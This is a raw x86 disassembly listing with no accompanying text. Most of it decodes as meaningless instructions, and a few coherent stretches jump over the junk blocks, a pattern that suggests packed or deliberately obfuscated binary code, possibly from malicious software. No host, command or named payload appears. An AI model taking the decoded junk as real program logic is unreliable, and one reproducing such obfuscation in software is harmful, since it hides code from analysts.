  4028e6:	stos   BYTE PTR es:[edi],al
  4028e7:	(bad)  
  4028e8:	pop    esp
  4028e9:	ficomp DWORD PTR [ebp+0x5c]
  4028ec:	fwait
  4028ed:	ds and al,0xa1
  4028f0:	cs test eax,0x93e47c15
  4028f6:	or     eax,DWORD PTR [ebp-0x4664a3c4]
  4028fc:	jno    0x402921
  4028fe:	mov    esp,0xc4697de3
  402903:	sub    al,BYTE PTR [ecx]
  402905:	cwde   
  402906:	test   DWORD PTR [edi],edi
  402908:	and    dh,0x7d
  40290b:	pop    ebx
  40290c:	rcl    BYTE PTR [eax-0x189c897f],1
  402912:	std    
  402913:	or     al,ah
  402915:	mov    ah,0x16
  402917:	jae    0x402985
  402919:	in     al,0x60
  40291b:	adc    eax,0xaa226dc1
  402920:	mov    WORD PTR [edi+0x49d449b8],ds
  402926:	cmp    eax,0xde234d7d
  40292b:	or     al,0xeb
  40292d:	add    esi,ebp
  40292f:	imul   eax,ecx,0xc7ea4167
  402935:	enter  0x81ff,0xe2
  402939:	jl     0x4028fd
  40293b:	and    DWORD PTR [si+0x726a],eax
  402940:	ds hlt 
  402942:	nop
  402943:	stos   DWORD PTR es:[edi],eax
  402944:	inc    ebp
  402945:	bound  esi,QWORD PTR [eax]
  402947:	jae    0x4028d6
  402949:	aam    0xe3
  40294b:	dec    esp
  40294c:	xor    BYTE PTR [edx],bh
  40294e:	dec    eax
  40294f:	push   ecx
  402950:	add    BYTE PTR [esi-0xdcaf4cc],al
  402956:	push   0xd734da28
  40295b:	daa    
  40295c:	jns    0x402918
  40295e:	sub    eax,0x9908f94e
  402963:	mov    cl,BYTE PTR ds:0x7d60655d
  402969:	jnp    0x4029ba
  40296b:	inc    esp
  40296c:	pop    edx
  40296d:	jge    0x40291d
  40296f:	jmp    0xa31e:0x3d14b853
  402976:	sti    
  402977:	push   esi
  402978:	inc    edx
  402979:	mov    al,ds:0xf51e1504
  40297e:	shl    DWORD PTR [eax+eax*2-0x7580cefc],1
  402985:	cmp    bx,WORD PTR [edi]
  402988:	pop    esp
  402989:	and    eax,0x2f7612ce
  40298e:	btc    DWORD PTR [esi-0x5e],edi
  402992:	xor    BYTE PTR [edi-0x42],0xcc
  402996:	push   eax
  402997:	stos   DWORD PTR es:[edi],eax
  402998:	pop    edi
  402999:	cmp    eax,0x25a4b16f
  40299e:	pusha  
  40299f:	mov    esi,0x2399e5ed
  4029a4:	dec    esp
  4029a5:	cwde   
  4029a6:	arpl   WORD PTR [ebx+0x4c],cx
  4029a9:	dec    DWORD PTR [edi-0x2d0740f2]
  4029af:	sbb    eax,0x3cc0164d
  4029b4:	mov    cs:0xcb8c1e51,eax
  4029ba:	fstp   st(7)
  4029bc:	ficomp DWORD PTR [ebx+0x56]
  4029bf:	rcr    cl,0x76
  4029c2:	mov    esi,0xded57ae4
  4029c7:	aad    0x42
  4029c9:	xchg   esi,eax
  4029ca:	or     dl,BYTE PTR [ecx-0x5ae37916]
  4029d0:	pushf  
  4029d1:	test   DWORD PTR [edx],edx
  4029d3:	dec    ebx
  4029d4:	in     al,dx
  4029d5:	pop    edi
  4029d6:	sbb    bl,ch
  4029d8:	adc    eax,0x14da3758
  4029dd:	sub    al,0xd0
  4029df:	cld    
  4029e0:	xchg   esi,eax
  4029e1:	xchg   edi,eax
  4029e2:	or     DWORD PTR [ebx-0x7d],0x4a361a0d
  4029e9:	or     BYTE PTR [edx],ah
  4029eb:	sti    
  4029ec:	leave  
  4029ed:	xor    cl,bh
  4029ef:	lea    ebp,[eax-0x2e12d441]
  4029f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029f6:	pop    edi
  4029f7:	cs push ebp
  4029f9:	mov    ch,0x4b
  4029fb:	cmp    cl,BYTE PTR [edx+ebx*1]
  4029fe:	push   eax
  4029ff:	cmp    al,0x91
  402a01:	call   0x79c4:0xa073df23
  402a08:	pop    es
  402a09:	loopne 0x402997
  402a0b:	enter  0x707c,0xd8
  402a0f:	daa    
  402a10:	push   ds
  402a11:	popa   
  402a12:	aam    0x8b
  402a14:	inc    ebp
  402a15:	aam    0xf
  402a17:	test   DWORD PTR [ebx],eax
  402a19:	add    BYTE PTR [eax],al
  402a1b:	add    BYTE PTR [ebx-0x39cc0fbb],cl
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	ds inc edi
  402a36:	popf   
  402a37:	mov    ds:0x7e7e0daa,al
  402a3c:	cli    
  402a3d:	jg     0x402abd
  402a3f:	jle    0x402a91
  402a41:	sbb    edi,DWORD PTR ds:0x7e67c14f
  402a47:	shr    BYTE PTR [esi-0x54],1
  402a4a:	push   esi
  402a4b:	dec    esi
  402a4c:	(bad)  
  402a4d:	dec    ecx
  402a4e:	enter  0xff3f,0x91
  402a52:	fs mov al,0x46
  402a56:	in     al,dx
  402a57:	test   dh,dh
  402a59:	fisubr WORD PTR [eax-0x50]
  402a5c:	jmp    0xa23d:0x70ba25f4
  402a63:	stc    
  402a64:	inc    esp
  402a65:	inc    esi
  402a66:	fwait
  402a67:	dec    ebp
  402a68:	pop    ecx
  402a69:	push   cs
  402a6a:	lds    eax,FWORD PTR ds:0x25ba1f26
  402a70:	out    0x33,al
  402a72:	or     DWORD PTR [eax+ecx*8-0x77],ecx
  402a76:	jbe    0x3cc4e42b
  402a7c:	xor    al,0x39
  402a7e:	(bad)  
  402a7f:	in     al,dx
  402a80:	data16 mov ah,BYTE PTR cs:[eax-0x1d]
  402a85:	pop    eax
  402a86:	adc    edx,ebx
  402a88:	ror    DWORD PTR [ecx+0x55],1
  402a8b:	popa   
  402a8c:	adc    eax,0xf4f91dd2
  402a91:	adc    al,0xe
  402a93:	outs   dx,DWORD PTR ds:[esi]
  402a94:	in     eax,0x8c
  402a96:	xchg   DWORD PTR [eax+0x15089bdd],ecx
  402a9c:	sub    DWORD PTR [eax+0x75c44e9c],ecx
  402aa2:	pop    ebp
  402aa3:	sbb    al,0x5c
  402aa5:	lods   al,BYTE PTR ds:[esi]
  402aa6:	adc    al,0x64
  402aa8:	add    ecx,esp
  402aaa:	cli    
  402aab:	adc    eax,0x2d19f4c3
  402ab0:	mov    ebp,0xfb26dc25
  402ab5:	xchg   ecx,eax
  402ab6:	jmp    0x402a3d
  402ab8:	push   edi
  402ab9:	mov    ch,0x87
  402abb:	push   edi
  402abc:	(bad)  
  402abd:	xchg   esp,eax
  402abe:	xchg   ecx,eax
  402abf:	sbb    al,0x5a
  402ac1:	adc    al,0xb3
  402ac3:	outs   dx,BYTE PTR ds:[esi]
  402ac4:	adc    al,bh
  402ac6:	sbb    DWORD PTR ds:0xc0e17c68,ebp
  402acc:	push   ebx
  402acd:	jae    0x402abb
  402acf:	imul   edx,DWORD PTR [edi],0x717c09d3
  402ad5:	shl    ch,0x9c
  402ad8:	ins    BYTE PTR es:[edi],dx
  402ad9:	sbb    al,0xa2
  402adb:	sub    eax,0x3989a927
  402ae0:	mov    cl,0xa7
  402ae2:	pop    esi
  402ae3:	(bad)  
  402ae4:	enter  0xcea5,0x34
  402ae8:	jmp    0xe3c5:0xfbf10bf0
  402aef:	aas    
  402af0:	aaa    
  402af1:	or     BYTE PTR [edx-0x7a],dl
  402af4:	or     al,0xce
  402af6:	mov    eax,0x935961a9
  402afb:	dec    eax
  402afc:	push   0x7935e4f9
  402b01:	aas    
  402b02:	into   
  402b03:	or     eax,0x73ac9c56
  402b08:	inc    esi
  402b09:	xor    BYTE PTR [edi+0x1e],ah
  402b0c:	and    cl,BYTE PTR [ebx]
  402b0e:	xchg   bh,bl
  402b10:	lahf   
  402b11:	jp     0x402b1b
  402b13:	pop    esp
  402b14:	repz mov ah,0x15
  402b17:	ror    BYTE PTR [edi+edx*2-0x23576b89],0x3f
  402b1f:	(bad)  
  402b20:	xchg   esp,eax
  402b21:	jle    0x402b84
  402b23:	cmp    BYTE PTR ds:0x119bec86,dl
  402b29:	mov    eax,ebp
  402b2b:	mov    al,0x75
  402b2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b2e:	xchg   ebp,eax
  402b2f:	or     BYTE PTR [edx-0x6b],0x38
  402b33:	adc    cl,BYTE PTR ss:[esi+0x49]
  402b37:	sub    al,0xb0
  402b39:	inc    eax
  402b3a:	je     0x402ad9
  402b3c:	je     0x402b9e
  402b3e:	cmp    ah,cl
  402b40:	or     eax,0xae9f73e4
  402b45:	sbb    eax,0xe56169c2
  402b4a:	push   0x3d
  402b4c:	sbb    al,0x9c
  402b4e:	ja     0x402ad6
  402b50:	es jl  0x402ae8
  402b53:	imul   edx,ebp,0xe523b994
  402b59:	(bad)  
  402b5a:	outs   dx,DWORD PTR ds:[esi]
  402b5b:	cdq    
  402b5c:	jno    0x402b3f
  402b5e:	push   esp
  402b5f:	mov    ah,0x99
  402b61:	cmp    ecx,DWORD PTR [ebx+0x28]
  402b64:	mov    ds:0x822801c0,eax
  402b69:	pop    es
  402b6a:	xchg   esi,eax
  402b6b:	cmp    edi,DWORD PTR [ecx+edi*1+0x3db60af3]
  402b72:	pop    esp
  402b73:	lods   al,BYTE PTR ds:[esi]
  402b74:	and    bh,BYTE PTR [ebx]
  402b76:	or     eax,0xbe39eb01
  402b7b:	imul   ebx,edx,0xba18b3bf
  402b81:	in     al,0x87
  402b83:	retf   
  402b84:	cmc    
  402b85:	mov    ch,BYTE PTR [edx+ecx*8]
  402b88:	(bad)  
  402b89:	mov    dl,0x8e
  402b8b:	ins    BYTE PTR es:[edi],dx
  402b8c:	jge    0x402bbc
  402b8e:	in     al,dx
  402b8f:	xchg   edx,eax
  402b90:	push   es
  402b91:	mov    DWORD PTR [edi+0x277ee5b7],0x24c69d49
  402b9b:	shl    DWORD PTR [esi+0x643c114f],0x94
  402ba2:	mov    ds:0xdc96374a,al
  402ba7:	ret    0x25a
  402baa:	xlat   BYTE PTR ds:[ebx]
  402bab:	bound  ecx,QWORD PTR [esi-0x4b]
  402bae:	and    DWORD PTR [esi+0x7d37d2e9],edx
  402bb4:	jge    0x402bb3
  402bb6:	cdq    
  402bb7:	adc    al,0xc
  402bb9:	inc    esp
  402bba:	mov    ebx,0xbdaedbca
  402bbf:	jecxz  0x402b8f
  402bc1:	sub    DWORD PTR [ebx+0xfc0850f],ebx
  402bc7:	test   BYTE PTR [eax],ch
  402bc9:	add    BYTE PTR [eax],al
  402bcb:	add    BYTE PTR [ebp-0x977b],cl
  402bd1:	call   DWORD PTR [eax-0x75]
  402bd4:	inc    ebp
  402bd5:	in     al,0x33
  402bd7:	mov    BYTE PTR [ebx],0xc7
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	jmp    0x7e0b:0x367944eb
  402c18:	jle    0x402c14
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402bf7
  402c1e:	idiv   BYTE PTR [edi]
  402c20:	fbld   TBYTE PTR [edx+0x62]
  402c23:	idiv   esp
  402c25:	stos   DWORD PTR es:[edi],eax
  402c26:	dec    ebp
  402c27:	mov    ebp,0x5e703e2
  402c2c:	push   ss
  402c2d:	add    al,0x97
  402c2f:	retf   
  402c30:	and    al,0x7d
  402c32:	lock int3 
  402c34:	js     0x402bf6
  402c36:	or     DWORD PTR [ebx],esi
  402c38:	out    0xbf,eax
  402c3a:	das    
  402c3b:	popf   
  402c3c:	call   0x8949:0xf0ccc1e1
  402c43:	pop    edi
  402c44:	mov    eax,0x83fa8705
  402c49:	daa    
  402c4a:	or     eax,0xa9ec7c5b
  402c4f:	xor    al,BYTE PTR [esi+edi*2]
  402c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c53:	dec    eax
  402c54:	fsubr  QWORD PTR [ebx-0x18]
  402c57:	dec    ebx
  402c58:	fadd   QWORD PTR [ecx-0x4528d7d8]
  402c5e:	mov    dh,0xf2
  402c60:	and    eax,0x69182616
  402c65:	loopne 0x402c8f
  402c67:	jg     0x402c69
  402c69:	test   BYTE PTR [ebx+ecx*1+0xbff60d0],0xdf
  402c71:	lahf   
  402c72:	push   0xfefa4214
  402c77:	ins    BYTE PTR es:[edi],dx
  402c78:	xchg   edx,eax
  402c79:	fwait
  402c7a:	cmp    bl,BYTE PTR [eax]
  402c7c:	test   eax,edi
  402c7e:	push   es
  402c7f:	(bad)  
  402c80:	popa   
  402c81:	mov    dl,0x28
  402c83:	dec    esi
  402c84:	adc    dl,BYTE PTR [ecx+eiz*2-0x76]
  402c88:	or     al,0x51
  402c8a:	xchg   edi,eax
  402c8b:	mov    eax,0x5aed8f8c
  402c90:	nop
  402c91:	mov    bh,0xa
  402c93:	mov    al,ds:0x581a2f8e
  402c98:	daa    
  402c99:	shr    ah,cl
  402c9b:	jmp    0x8941:0x8db5031e
  402ca2:	cmp    al,0x3e
  402ca4:	pushf  
  402ca5:	adc    cl,BYTE PTR [esi]
  402ca7:	and    esi,edi
  402ca9:	lods   al,BYTE PTR ds:[esi]
  402caa:	xor    eax,0x78d58dcc
  402caf:	mov    WORD PTR [eax],?
  402cb1:	mov    bh,0x89
  402cb3:	repz bnd jbe 0x402c72
  402cb7:	lods   eax,DWORD PTR ds:[esi]
  402cb8:	jmp    DWORD PTR [esi]
  402cba:	test   BYTE PTR [esp+esi*4],0xdc
  402cbe:	cmc    
  402cbf:	(bad)  
  402cc0:	mov    edx,0xf0268527
  402cc5:	outs   dx,DWORD PTR ds:[esi]
  402cc6:	mov    cl,BYTE PTR es:[esi]
  402cc9:	inc    edx
  402cca:	mov    ecx,0x46e1c19b
  402ccf:	cwde   
  402cd0:	sub    DWORD PTR [edi+ebx*4],esp
  402cd3:	or     BYTE PTR [ebp+0x47],cl
  402cd6:	shl    DWORD PTR [esi-0x1841b53e],1
  402cdc:	and    edx,ebp
  402cde:	sub    BYTE PTR [eax+0x486dfe93],0x5e
  402ce5:	mov    BYTE PTR ds:0x7695f8ed,0xdd
  402cec:	sub    ebp,DWORD PTR [ebx-0x42]
  402cef:	fdivrp st(1),st
  402cf1:	add    eax,DWORD PTR [edx+0x57]
  402cf4:	xor    BYTE PTR [bp-0x69],ah
  402cf8:	jmp    0x402cbc
  402cfa:	cmp    bh,BYTE PTR [esi-0x10ef717d]
  402d00:	rcl    BYTE PTR [ecx+ecx*1],1
  402d03:	pop    eax
  402d04:	enter  0x1649,0xb1
  402d08:	push   eax
  402d09:	mov    bh,0xf1
  402d0b:	mov    dh,0xd0
  402d0d:	(bad)  
  402d0f:	test   al,0x45
  402d11:	sbb    DWORD PTR [ebx],edi
  402d13:	cmp    bl,BYTE PTR [ecx+esi*2]
  402d16:	pop    ebp
  402d17:	add    eax,0x7e2ac86c
  402d1c:	rcl    DWORD PTR [esi+0x1bdd2368],1
  402d22:	ret    
  402d23:	sbb    al,0xb9
  402d25:	rcl    DWORD PTR [esp+ebp*8-0x5fadb743],0x5d
  402d2d:	repz pop ebx
  402d2f:	jae    0x402d39
  402d31:	push   edx
  402d32:	cld    
  402d33:	ds and al,0x50
  402d36:	iret   
  402d37:	pop    ebp
  402d38:	cwde   
  402d39:	push   edi
  402d3a:	test   al,0x5f
  402d3c:	not    esi
  402d3e:	jbe    0x402d48
  402d40:	fwait
  402d41:	adc    ebx,DWORD PTR [ebx-0x5c]
  402d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d45:	sbb    bh,dh
  402d47:	mov    edi,DWORD PTR [esi+0x5d2259c2]
  402d4d:	dec    ecx
  402d4e:	test   eax,0xe6e356e1
  402d53:	sbb    ecx,0xe985ee5e
  402d59:	popa   
  402d5a:	inc    ecx
  402d5b:	push   ecx
  402d5c:	xchg   ebx,eax
  402d5d:	lock lea edi,[edi+0x51]
  402d61:	jno    0x402d97
  402d63:	cmc    
  402d64:	jge    0x402d07
  402d66:	ret    0xfa1c
  402d69:	xor    eax,0x2c937730
  402d6e:	call   0x3c5b:0x92ff7b30
  402d75:	inc    ebx
  402d76:	fbld   TBYTE PTR [esi+edi*2]
  402d79:	sub    eax,0x66b73b01
  402d7e:	mov    dl,0x35
  402d80:	ss (bad) 
  402d82:	test   al,0x8b
  402d84:	add    BYTE PTR ds:0x947c2afa,dh
  402d8a:	add    eax,DWORD PTR [ecx-0x7e821192]
  402d90:	jl     0x402de4
  402d92:	aaa    
  402d93:	sbb    BYTE PTR [edx],bh
  402d95:	ror    dh,0xe7
  402d98:	push   ds
  402d99:	push   ecx
  402d9a:	push   edi
  402d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d9c:	or     ebx,DWORD PTR [esi+0x2b89a844]
  402da2:	inc    ebp
  402da3:	cld    
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [eax+ebx*2+0x66],1
  402de7:	invd   
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402dfc
  402df2:	ins    BYTE PTR es:[edi],dx
  402df3:	scas   eax,DWORD PTR es:[edi]
  402df4:	pop    edx
  402df5:	lea    ecx,[ebp-0x2b4e1767]
  402dfb:	sbb    eax,DWORD PTR [edx+0x3d]
  402dfe:	fdiv   DWORD PTR [ebx-0x68c3d2ee]
  402e04:	inc    edi
  402e05:	pop    ds
  402e06:	out    dx,eax
  402e07:	das    
  402e08:	cmc    
  402e09:	scas   al,BYTE PTR es:[edi]
  402e0a:	jno    0x402e6f
  402e0c:	mov    bh,0xb
  402e0e:	sbb    BYTE PTR [eax+0x6e],dl
  402e11:	jmp    0x1a906704
  402e16:	cli    
  402e17:	xor    al,0x44
  402e19:	push   es
  402e1a:	jge    0x402e28
  402e1c:	and    BYTE PTR [eax+0x46],0x65
  402e20:	push   ecx
  402e21:	add    ah,BYTE PTR [ebx-0x2f]
  402e24:	cmp    al,0x18
  402e26:	add    al,0x75
  402e28:	jnp    0x402db5
  402e2a:	mov    al,0x64
  402e2c:	test   BYTE PTR [ebx+0x5d],bh
  402e2f:	mov    edi,0xd526f706
  402e34:	inc    ecx
  402e35:	mov    bl,0x8c
  402e37:	xlat   BYTE PTR ds:[ebx]
  402e38:	lods   al,BYTE PTR ds:[esi]
  402e39:	cmp    ch,BYTE PTR [edx-0x49]
  402e3c:	leave  
  402e3d:	or     eax,0x198d2571
  402e42:	xchg   esi,eax
  402e43:	cmp    BYTE PTR [ebx],cl
  402e45:	inc    esi
  402e46:	sub    cl,bl
  402e48:	or     bl,0x94
  402e4b:	bound  esi,QWORD PTR [eax+0x4e]
  402e4e:	scas   eax,DWORD PTR es:[edi]
  402e4f:	out    dx,eax
  402e50:	mov    ebp,0x3a23c1be
  402e55:	rcl    DWORD PTR [edi-0x30448d6c],cl
  402e5b:	jnp    0x402e81
  402e5d:	mov    esp,0x5647f0b2
  402e62:	cdq    
  402e63:	mov    BYTE PTR [edx],dl
  402e65:	cmp    BYTE PTR [ecx+0x72453a72],0x84
  402e6c:	loop   0x402e52
  402e6e:	pop    esi
  402e6f:	sub    DWORD PTR [edx+0x3507c80a],eax
  402e75:	retf   
  402e76:	cmc    
  402e77:	je     0x402ef8
  402e79:	or     ebp,DWORD PTR [ebp-0x1f357030]
  402e7f:	xchg   ebp,eax
  402e80:	test   al,0x34
  402e82:	push   es
  402e83:	push   ds
  402e84:	rcr    BYTE PTR [ebp-0x65eddff3],1
  402e8a:	sub    al,0x5f
  402e8c:	push   0xffffff9e
  402e8e:	ins    DWORD PTR es:[edi],dx
  402e8f:	enter  0xa260,0x38
  402e93:	push   0xffffff9d
  402e95:	outs   dx,DWORD PTR ds:[esi]
  402e96:	or     BYTE PTR [ecx+0x8193130],ch
  402e9c:	pop    ds
  402e9d:	rcl    BYTE PTR [edx+0x1dd55f81],cl
  402ea3:	mov    ecx,0xbc28806
  402ea8:	cmc    
  402ea9:	fcomip st,st(6)
  402eab:	lock scas al,BYTE PTR es:[edi]
  402ead:	addr16 lock adc eax,0x4ca2706
  402eb4:	xlat   BYTE PTR ds:[ebx]
  402eb5:	repnz mov fs,ebx
  402eb8:	das    
  402eb9:	mov    bh,0x94
  402ebb:	push   edx
  402ebc:	push   ss
  402ebd:	adc    al,0xd6
  402ebf:	enter  0x9dbe,0x80
  402ec3:	sbb    BYTE PTR [ebp-0x4f],cl
  402ec6:	mov    cs,WORD PTR [edx-0x195411dd]
  402ecc:	mov    dh,0x57
  402ece:	mov    esp,0x523073c4
  402ed3:	iret   
  402ed4:	test   bl,ch
  402ed6:	inc    esi
  402ed7:	jae    0x402e89
  402ed9:	pop    ebp
  402eda:	test   al,0x50
  402edc:	loope  0x402e71
  402ede:	mov    eax,0xde028ceb
  402ee3:	fistp  QWORD PTR [edx-0x64]
  402ee6:	adc    eax,0x3200a28f
  402eeb:	mov    ah,0xf2
  402eed:	push   ds
  402eee:	mov    al,0x0
  402ef0:	fldl2t 
  402ef2:	mov    edx,es
  402ef4:	xchg   BYTE PTR [ebx],bl
  402ef6:	idiv   DWORD PTR [edi+0x4ace61d2]
  402efc:	push   eax
  402efd:	ss (bad) 
  402eff:	aaa    
  402f00:	pop    ss
  402f01:	ins    BYTE PTR es:[edi],dx
  402f02:	xchg   edx,eax
  402f03:	mov    eax,ecx
  402f05:	pop    ebx
  402f06:	loope  0x402ef0
  402f08:	inc    esi
  402f09:	jmp    0x402e8f
  402f0b:	push   ebp
  402f0c:	mov    dl,0xe3
  402f0e:	mov    dh,0x9d
  402f10:	push   eax
  402f11:	popa   
  402f12:	(bad)  
  402f13:	mov    gs,WORD PTR [edx-0x65]
  402f16:	jns    0x402f66
  402f18:	cwde   
  402f19:	xchg   ecx,eax
  402f1a:	pop    ebp
  402f1b:	jge    0x402ea0
  402f1d:	sub    al,0x36
  402f1f:	aas    
  402f20:	clc    
  402f21:	xlat   BYTE PTR ds:[ebx]
  402f22:	jg     0x402ea7
  402f24:	in     al,0x9b
  402f26:	(bad)  
  402f27:	cli    
  402f28:	dec    edx
  402f29:	sahf   
  402f2a:	push   ss
  402f2b:	push   ss
  402f2c:	mov    ds:0xf04f2fa0,al
  402f31:	fisubr DWORD PTR [ebp+ecx*2-0x76]
  402f35:	or     al,0x91
  402f37:	addr16 mov bl,0x46
  402f3a:	fwait
  402f3b:	xor    ecx,ebp
  402f3d:	xchg   esi,eax
  402f3e:	test   DWORD PTR [ecx],eax
  402f40:	bound  esp,QWORD PTR ds:0xa163e693
  402f46:	ret    0x6cc5
  402f49:	gs mov esp,0xfabe5361
  402f4f:	jp     0x402f77
  402f51:	mov    al,0x66
  402f53:	ja     0x402f79
  402f55:	pop    ecx
  402f56:	lods   al,BYTE PTR ds:[esi]
  402f57:	loop   0x402f79
  402f59:	fstp   QWORD PTR [esi]
  402f5b:	in     al,dx
  402f5c:	xor    bh,bl
  402f5e:	mov    ?,WORD PTR [esi+ebp*2-0x5647a856]
  402f65:	xchg   ecx,eax
  402f66:	retf   0xf54d
  402f69:	stos   DWORD PTR es:[edi],eax
  402f6a:	and    BYTE PTR [eax],bh
  402f6c:	pop    eax
  402f6d:	sar    BYTE PTR gs:[edi+0x2f],cl
  402f71:	lods   al,BYTE PTR ds:[esi]
  402f72:	mov    bh,0xa7
  402f74:	push   cs
  402f75:	lea    eax,ds:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi+0x14a5a5b7]
  402fae:	sub    BYTE PTR ds:0x7e7e163e,dl
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x403009
  402fb9:	inc    ecx
  402fba:	add    eax,0x61277b96
  402fbf:	test   dl,bl
  402fc1:	inc    ebx
  402fc2:	pop    esi
  402fc3:	mov    ecx,0xecc5f40d
  402fc8:	mov    ecx,0xd9ccadf7
  402fcd:	sub    DWORD PTR [ebx],esp
  402fcf:	xchg   esi,eax
  402fd0:	mov    bl,0x96
  402fd2:	fld    QWORD PTR [edi+eax*4]
  402fd5:	data16 mov bh,0x29
  402fd8:	cs ffreep st(0)
  402fdb:	aad    0x35
  402fdd:	aaa    
  402fde:	scas   al,BYTE PTR es:[edi]
  402fdf:	ins    BYTE PTR es:[edi],dx
  402fe0:	xor    ah,BYTE PTR [edi]
  402fe2:	nop
  402fe3:	enter  0xbde,0x87
  402fe7:	popa   
  402fe8:	dec    edx
  402fe9:	out    dx,al
  402fea:	out    0x2,eax
  402fec:	idiv   DWORD PTR [ecx]
  402fee:	sahf   
  402fef:	pop    eax
  402ff0:	mov    al,ds:0x9d27a0ee
  402ff5:	lds    edx,FWORD PTR [eax]
  402ff7:	gs push esp
  402ff9:	adc    ebx,DWORD PTR [esi-0x343fe683]
  402fff:	mov    ebp,DWORD PTR ss:0x5d50427c
  403006:	ins    BYTE PTR es:[edi],dx
  403007:	sbb    DWORD PTR [edi+0x5],ecx
  40300a:	xchg   ecx,eax
  40300b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40300c:	xchg   esp,eax
  40300d:	pop    ebp
  40300e:	sub    eax,eax
  403010:	jg     0x402fbc
  403012:	fcom   DWORD PTR [eax]
  403014:	mov    ?,WORD PTR [ebp-0x17effcf6]
  40301a:	bnd ret 0x5e2e
  40301e:	and    DWORD PTR [ebp+edx*4+0x7d2aab42],ecx
  403025:	je     0x403053
  403027:	aad    0x8c
  403029:	fist   DWORD PTR [ebx+0x5fca84ee]
  40302f:	xchg   edi,eax
  403030:	dec    ebp
  403031:	(bad)  [ebp-0x65]
  403034:	xchg   ecx,eax
  403035:	mov    ds:0xe191c5d,al
  40303a:	jmp    0x712a:0x590579ca
  403041:	mov    dl,0x81
  403043:	jg     0x4030a0
  403045:	pop    ss
  403046:	and    edx,edx
  403048:	(bad)  
  403049:	rcr    BYTE PTR [ebx-0x63c1ffb3],cl
  40304f:	and    al,0x6f
  403051:	add    eax,0x91d2718b
  403056:	or     BYTE PTR [ebp-0x41],cl
  403059:	pop    edx
  40305a:	and    DWORD PTR [eax+0x3b019185],ebx
  403060:	cwde   
  403061:	js     0x40305c
  403063:	push   0x14
  403065:	push   0x49
  403067:	ins    BYTE PTR es:[edi],dx
  403068:	or     al,BYTE PTR [ebx]
  40306a:	repnz push ebx
  40306c:	mov    BYTE PTR [ebx+0x4f],bl
  40306f:	ins    DWORD PTR es:[edi],dx
  403070:	mov    ch,0xaf
  403072:	xor    ecx,DWORD PTR [esi-0xf]
  403075:	cmp    bl,ah
  403077:	sub    ch,bl
  403079:	jge    0x4030c6
  40307b:	adc    eax,0x344f9b3c
  403080:	cwde   
  403081:	jae    0x4030a1
  403083:	inc    eax
  403084:	xor    ebx,ebx
  403086:	fwait
  403087:	(bad)  
  403088:	adc    DWORD PTR [eax+esi*4],esp
  40308b:	into   
  40308c:	mov    esp,0x38c603f
  403091:	cmp    dl,bh
  403093:	mov    cs,WORD PTR [esi-0x49]
  403096:	daa    
  403097:	jne    0x403082
  403099:	ins    DWORD PTR es:[edi],dx
  40309a:	mov    ds:0x2b3a1ea3,al
  40309f:	gs sti 
  4030a1:	sub    DWORD PTR [edi-0x62d37aaf],0xde059406
  4030ab:	push   ds
  4030ac:	aas    
  4030ad:	neg    al
  4030af:	add    esp,DWORD PTR [esi-0x61caca06]
  4030b5:	sub    eax,0x3b49d30c
  4030ba:	stos   BYTE PTR es:[edi],al
  4030bb:	imul   eax,DWORD PTR [edi+0x65baec7f],0xb0093d79
